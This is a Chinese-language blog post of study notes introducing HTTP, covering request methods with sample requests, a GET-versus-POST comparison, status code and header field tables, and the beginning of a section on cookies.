<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<!-- 20180426-->
<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<style>
    .pace .pace-progress {
        background: #1E92FB; /*进度条颜色*/
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
    }
    .pace .pace-activity {
        border-top-color: #1E92FB;    /*上边框颜色*/
        border-left-color: #1E92FB;    /*左边框颜色*/
    }
</style>

<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="HTTP," />










<meta name="description" content="博主最近在复习HTTP，之前用书主要是《计算机网络》谢希仁版本和上野宣的《图解HTTP》，最近结合网上博客，进行复习和提纲式的总结。">
<meta name="keywords" content="HTTP">
<meta property="og:type" content="article">
<meta property="og:title" content="HTTP入门">
<meta property="og:url" content="http://yoursite.com/2018/07/26/HTTP入门/index.html">
<meta property="og:site_name" content="Xudong&#39;s blogs">
<meta property="og:description" content="博主最近在复习HTTP，之前用书主要是《计算机网络》谢希仁版本和上野宣的《图解HTTP》，最近结合网上博客，进行复习和提纲式的总结。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/12485510.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/39921486.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/32964322.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/80297925.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/26689072.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/94515938.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/66012394.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/33259482.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/93316149.jpg">
<meta property="og:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/20763012.jpg">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/11861611-fab203ef34c74acb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2018-07-26T11:34:52.489Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HTTP入门">
<meta name="twitter:description" content="博主最近在复习HTTP，之前用书主要是《计算机网络》谢希仁版本和上野宣的《图解HTTP》，最近结合网上博客，进行复习和提纲式的总结。">
<meta name="twitter:image" content="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/12485510.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/07/26/HTTP入门/"/>





  <title>HTTP入门 | Xudong's blogs</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Xudong's blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">email:2228998096@qq.com    wechat:yxd19940114</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/HTTP入门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="杨旭东">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xudong's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">HTTP入门</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-26T19:09:04+08:00">
                2018-07-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/计算机网络/" itemprop="url" rel="index">
                    <span itemprop="name">计算机网络</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>博主最近在复习HTTP，之前用书主要是《计算机网络》谢希仁版本和上野宣的《图解HTTP》，最近结合网上博客，进行复习和提纲式的总结。</p>
<a id="more"></a>
<h1 id="一-基础概念"><a href="#一-基础概念" class="headerlink" title="一. 基础概念"></a>一. 基础概念</h1><h2 id="Web-基础"><a href="#Web-基础" class="headerlink" title="Web 基础"></a>Web 基础</h2><p>HTTP（HyperText Transfer Protocol，超文本传输协议）。<br>WWW（World Wide Web）的三种技术：HTML、HTTP、URL。<br>RFC（Request for Comments，征求修正意见书），互联网的设计文档。</p>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul>
<li>URI（Uniform Resource Indentifier，统一资源标识符）</li>
<li>URL（Uniform Resource Locator，统一资源定位符）</li>
<li>URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。</li>
</ul>
<p>URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。</p>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/12485510.jpg" alt="URL"></p>
<h2 id="请求和响应报文"><a href="#请求和响应报文" class="headerlink" title="请求和响应报文"></a>请求和响应报文</h2><ul>
<li>请求报文</li>
</ul>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/39921486.jpg" alt="请求报文"></p>
<ul>
<li>响应报文</li>
</ul>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/32964322.jpg" alt=" 响应报文"></p>
<h1 id="二-HTTP-方法"><a href="#二-HTTP-方法" class="headerlink" title="二. HTTP 方法"></a>二. HTTP 方法</h1><p>客户端发送的 <strong>请求报文</strong> 第一行为请求行<code>Request Line</code>，包含了方法字段。</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><blockquote>
<p>获取资源</p>
</blockquote>
<p>当前网络请求中，绝大部分使用的是 GET 方法。</p>
<h2 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h2><blockquote>
<p>获取报文首部</p>
</blockquote>
<p>和 GET 方法一样，但是<strong>不返回报文实体主体部分</strong>。</p>
<p>主要用于确认 URL 的有效性以及资源更新的日期时间等。</p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><blockquote>
<p>传输实体主体</p>
</blockquote>
<p>POST 主要目的不是获取资源，而是传输存储在内容实体中的数据。</p>
<h2 id="GET-和-POST对比"><a href="#GET-和-POST对比" class="headerlink" title="GET 和 POST对比"></a>GET 和 POST对比</h2><h3 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1. 安全性"></a>1. 安全性</h3><p>GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。</p>
<p>GET 和 POST 的请求都能使用额外的参数，但是</p>
<ul>
<li>GET 的参数是以查询字符串出现在 URL 中</li>
<li>POST 的参数存储在内容实体</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test/demo_form.asp?name1=value1&amp;name2=value2</span> HTTP/1.1</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/demo_form.asp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: w3schools.com</span><br><span class="line">name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure>
<h4 id="2-编码"><a href="#2-编码" class="headerlink" title="2. 编码"></a>2. 编码</h4><p>并且 <strong>GET 只支持 ASCII 字符</strong>，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。</p>
<h3 id="3-服务器状态"><a href="#3-服务器状态" class="headerlink" title="3. 服务器状态"></a>3. 服务器状态</h3><p>安全的 HTTP 方法<strong>不会改变服务器状态</strong>，也就是说它只是可读的。</p>
<p>GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。</p>
<p>安全的方法除了 GET 之外还有：HEAD、OPTIONS。</p>
<p>不安全的方法除了 POST 之外还有： PUT、DELETE。</p>
<h3 id="4-幂等性"><a href="#4-幂等性" class="headerlink" title="4. 幂等性"></a>4. 幂等性</h3><p>幂等的 HTTP 方法，<strong>同样的请求被执行一次与连续执行多次的效果是一样的</strong>，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。<br>在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。</p>
<h3 id="5-可缓存"><a href="#5-可缓存" class="headerlink" title="5. 可缓存"></a>5. 可缓存</h3><p>如果要对响应进行缓存，需要满足以下条件：</p>
<ul>
<li>请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的</li>
<li>响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。</li>
<li>响应报文的 Cache-Control 首部字段没有指定不进行缓存。</li>
</ul>
<h3 id="6-响应过程"><a href="#6-响应过程" class="headerlink" title="6. 响应过程"></a>6. 响应过程</h3><p>GET ：<br>浏览器会把 HTTP Header 和 Data<strong>一并发送出去</strong>，服务器响应 200（OK）并返回数据。<br> POST ：<br>浏览器先<strong>发送 Header</strong>，服务器响应 100（Continue）之后，浏览器<strong>再发送Data</strong>，最后服务器响应 200（OK）并返回数据。</p>
<h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><blockquote>
<p>上传文件</p>
</blockquote>
<p>由于<code>自身不带验证机制</code>，任何人都可以上传文件，因此<strong>存在安全性问题</strong>，一般不使用该方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /new.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 16</span><br><span class="line"></span><br><span class="line">&lt;p&gt;New File&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<h2 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h2><blockquote>
<p>对资源进行部分修改</p>
</blockquote>
<p>PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/example</span><br><span class="line">If-Match: &quot;e0023aa4e&quot;</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure>
<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><blockquote>
<p>删除文件</p>
</blockquote>
<p>与 PUT 功能相反，并且<strong>同样不带验证机制</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE /file.html HTTP/1.1</span><br></pre></td></tr></table></figure>
<h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><blockquote>
<p>查询支持的方法</p>
</blockquote>
<p>查询指定的 URL 能够支持的方法。</p>
<p>会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。</p>
<h2 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h2><blockquote>
<p>要求在与代理服务器通信时建立隧道</p>
</blockquote>
<p>使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP/1.1</span><br></pre></td></tr></table></figure>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/80297925.jpg" alt="CONNECT"></p>
<h2 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h2><blockquote>
<p>追踪路径</p>
</blockquote>
<p>服务器会将通信路径返回给客户端。</p>
<p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。</p>
<p><strong>通常不会使用 TRACE</strong>，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。</p>
<h1 id="三-HTTP-状态码"><a href="#三-HTTP-状态码" class="headerlink" title="三. HTTP 状态码"></a>三. HTTP 状态码</h1><p>服务器返回的 <strong>响应报文</strong> 中第一行为状态行<code>Status Line</code>，包含了状态码以及原因短语，用来告知客户端请求的结果。</p>
<table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">类别</th>
<th style="text-align:center">原因短语</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1XX</td>
<td style="text-align:center">Informational（信息性状态码）</td>
<td style="text-align:center">接收的请求正在处理</td>
</tr>
<tr>
<td style="text-align:center">2XX</td>
<td style="text-align:center">Success（成功状态码）</td>
<td style="text-align:center">请求正常处理完毕</td>
</tr>
<tr>
<td style="text-align:center">3XX</td>
<td style="text-align:center">Redirection（重定向状态码）</td>
<td style="text-align:center">需要进行附加操作以完成请求</td>
</tr>
<tr>
<td style="text-align:center">4XX</td>
<td style="text-align:center">Client Error（客户端错误状态码）</td>
<td style="text-align:center">服务器无法处理请求</td>
</tr>
<tr>
<td style="text-align:center">5XX</td>
<td style="text-align:center">Server Error（服务器错误状态码）</td>
<td style="text-align:center">服务器处理请求出错</td>
</tr>
</tbody>
</table>
<h2 id="1XX-信息"><a href="#1XX-信息" class="headerlink" title="1XX 信息"></a>1XX 信息</h2><table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">100</td>
<td style="text-align:center">Continue</td>
<td style="text-align:center">表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</td>
</tr>
</tbody>
</table>
<h2 id="2XX-成功"><a href="#2XX-成功" class="headerlink" title="2XX 成功"></a>2XX 成功</h2><table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">200</td>
<td style="text-align:center">OK</td>
<td style="text-align:center">请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td style="text-align:center">204</td>
<td style="text-align:center">No Content</td>
<td style="text-align:center">请求已经成功处理，但是返回的<strong>响应报文不包含实体的主体部分</strong>。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用</td>
</tr>
<tr>
<td style="text-align:center">206</td>
<td style="text-align:center">Partial Content</td>
<td style="text-align:center">表示客户端进行了范围请求。<strong>响应报文包含由 Content-Range 指定范围的实体内容</strong>。</td>
</tr>
</tbody>
</table>
<h2 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h2><table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">301</td>
<td style="text-align:center">Moved Permanently</td>
<td style="text-align:center">永久性重定向</td>
</tr>
<tr>
<td style="text-align:center">302</td>
<td style="text-align:center">Found</td>
<td style="text-align:center">临时性重定向</td>
</tr>
<tr>
<td style="text-align:center">303</td>
<td style="text-align:center">See Other</td>
<td style="text-align:center">和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源</td>
</tr>
<tr>
<td style="text-align:center">304</td>
<td style="text-align:center">Not Modified</td>
<td style="text-align:center">如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码</td>
</tr>
<tr>
<td style="text-align:center">307</td>
<td style="text-align:center">Temporary Redirect</td>
<td style="text-align:center">临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法</td>
</tr>
</tbody>
</table>
<p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向<strong>把 POST 方法改成 GET 方法</strong>。</p>
<h2 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h2><table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">400</td>
<td style="text-align:center">Bad Request</td>
<td style="text-align:center">请求报文中存在语法错误</td>
</tr>
<tr>
<td style="text-align:center">401</td>
<td style="text-align:center">Unauthorized</td>
<td style="text-align:center">该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败</td>
</tr>
<tr>
<td style="text-align:center">403</td>
<td style="text-align:center">Forbidden</td>
<td style="text-align:center">请求被拒绝，服务器端没有必要给出拒绝的详细理由</td>
</tr>
<tr>
<td style="text-align:center">404</td>
<td style="text-align:center">Not Found</td>
<td style="text-align:center">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
</tr>
</tbody>
</table>
<h2 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h2><table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">500</td>
<td style="text-align:center">Internal Server Error</td>
<td style="text-align:center">服务器正在执行请求时发生错误。</td>
</tr>
<tr>
<td style="text-align:center">503</td>
<td style="text-align:center">Service Unavilable</td>
<td style="text-align:center">服务器暂时处于超负载或正在进行停机维护，现在无法处理请求，延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
</tbody>
</table>
<h1 id="四-HTTP-首部"><a href="#四-HTTP-首部" class="headerlink" title="四. HTTP 首部"></a>四. HTTP 首部</h1><p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p>
<p>各种首部字段及其含义如下（不需要全记，仅供查阅）：</p>
<h2 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h2><table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Cache-Control</td>
<td style="text-align:center">控制缓存的行为</td>
</tr>
<tr>
<td style="text-align:center">Connection</td>
<td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td>
</tr>
<tr>
<td style="text-align:center">Date</td>
<td style="text-align:center">创建报文的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Pragma</td>
<td style="text-align:center">报文指令</td>
</tr>
<tr>
<td style="text-align:center">Trailer</td>
<td style="text-align:center">报文末端的首部一览</td>
</tr>
<tr>
<td style="text-align:center">Transfer-Encoding</td>
<td style="text-align:center">指定报文主体的传输编码方式</td>
</tr>
<tr>
<td style="text-align:center">Upgrade</td>
<td style="text-align:center">升级为其他协议</td>
</tr>
<tr>
<td style="text-align:center">Via</td>
<td style="text-align:center">代理服务器的相关信息</td>
</tr>
<tr>
<td style="text-align:center">Warning</td>
<td style="text-align:center">错误通知</td>
</tr>
</tbody>
</table>
<h2 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h2><table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept</td>
<td style="text-align:center">用户代理可处理的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Accept-Charset</td>
<td style="text-align:center">优先的字符集</td>
</tr>
<tr>
<td style="text-align:center">Accept-Encoding</td>
<td style="text-align:center">优先的内容编码</td>
</tr>
<tr>
<td style="text-align:center">Accept-Language</td>
<td style="text-align:center">优先的语言（自然语言）</td>
</tr>
<tr>
<td style="text-align:center">Authorization</td>
<td style="text-align:center">Web 认证信息</td>
</tr>
<tr>
<td style="text-align:center">Expect</td>
<td style="text-align:center">期待服务器的特定行为</td>
</tr>
<tr>
<td style="text-align:center">From</td>
<td style="text-align:center">用户的电子邮箱地址</td>
</tr>
<tr>
<td style="text-align:center">Host</td>
<td style="text-align:center">请求资源所在服务器</td>
</tr>
<tr>
<td style="text-align:center">If-Match</td>
<td style="text-align:center">比较实体标记（ETag）</td>
</tr>
<tr>
<td style="text-align:center">If-Modified-Since</td>
<td style="text-align:center">比较资源的更新时间</td>
</tr>
<tr>
<td style="text-align:center">If-None-Match</td>
<td style="text-align:center">比较实体标记（与 If-Match 相反）</td>
</tr>
<tr>
<td style="text-align:center">If-Range</td>
<td style="text-align:center">资源未更新时发送实体 Byte 的范围请求</td>
</tr>
<tr>
<td style="text-align:center">If-Unmodified-Since</td>
<td style="text-align:center">比较资源的更新时间（与 If-Modified-Since 相反）</td>
</tr>
<tr>
<td style="text-align:center">Max-Forwards</td>
<td style="text-align:center">最大传输逐跳数</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authorization</td>
<td style="text-align:center">代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Range</td>
<td style="text-align:center">实体的字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Referer</td>
<td style="text-align:center">对请求中 URI 的原始获取方</td>
</tr>
<tr>
<td style="text-align:center">TE</td>
<td style="text-align:center">传输编码的优先级</td>
</tr>
<tr>
<td style="text-align:center">User-Agent</td>
<td style="text-align:center">HTTP 客户端程序的信息</td>
</tr>
</tbody>
</table>
<h2 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h2><table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept-Ranges</td>
<td style="text-align:center">是否接受字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Age</td>
<td style="text-align:center">推算资源创建经过时间</td>
</tr>
<tr>
<td style="text-align:center">ETag</td>
<td style="text-align:center">资源的匹配信息</td>
</tr>
<tr>
<td style="text-align:center">Location</td>
<td style="text-align:center">令客户端重定向至指定 URI</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authenticate</td>
<td style="text-align:center">代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Retry-After</td>
<td style="text-align:center">对再次发起请求的时机要求</td>
</tr>
<tr>
<td style="text-align:center">Server</td>
<td style="text-align:center">HTTP 服务器的安装信息</td>
</tr>
<tr>
<td style="text-align:center">Vary</td>
<td style="text-align:center">代理服务器缓存的管理信息</td>
</tr>
<tr>
<td style="text-align:center">WWW-Authenticate</td>
<td style="text-align:center">服务器对客户端的认证信息</td>
</tr>
</tbody>
</table>
<h2 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h2><table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Allow</td>
<td style="text-align:center">资源可支持的 HTTP 方法</td>
</tr>
<tr>
<td style="text-align:center">Content-Encoding</td>
<td style="text-align:center">实体主体适用的编码方式</td>
</tr>
<tr>
<td style="text-align:center">Content-Language</td>
<td style="text-align:center">实体主体的自然语言</td>
</tr>
<tr>
<td style="text-align:center">Content-Length</td>
<td style="text-align:center">实体主体的大小</td>
</tr>
<tr>
<td style="text-align:center">Content-Location</td>
<td style="text-align:center">替代对应资源的 URI</td>
</tr>
<tr>
<td style="text-align:center">Content-MD5</td>
<td style="text-align:center">实体主体的报文摘要</td>
</tr>
<tr>
<td style="text-align:center">Content-Range</td>
<td style="text-align:center">实体主体的位置范围</td>
</tr>
<tr>
<td style="text-align:center">Content-Type</td>
<td style="text-align:center">实体主体的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Expires</td>
<td style="text-align:center">实体主体过期的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Last-Modified</td>
<td style="text-align:center">资源的最后修改日期时间</td>
</tr>
</tbody>
</table>
<h1 id="五-具体应用"><a href="#五-具体应用" class="headerlink" title="五. 具体应用"></a>五. 具体应用</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><strong>HTTP 协议是无状态的</strong>，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。<strong>HTTP/1.1 引入 Cookie 来保存状态信息</strong>。</p>
<p>Cookie 是<strong>服务器发送到用户浏览器并保存在本地的一小块数据</strong>，它会在浏览器下次向<strong>同一服务器</strong>再发起请求时<code>被携带并发送</code>到服务器上。它用于告知服务端两个请求是否来自同一浏览器，并保持用户的登录状态。</p>
<h3 id="1-Cookie用途"><a href="#1-Cookie用途" class="headerlink" title="1. Cookie用途"></a>1. Cookie用途</h3><ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
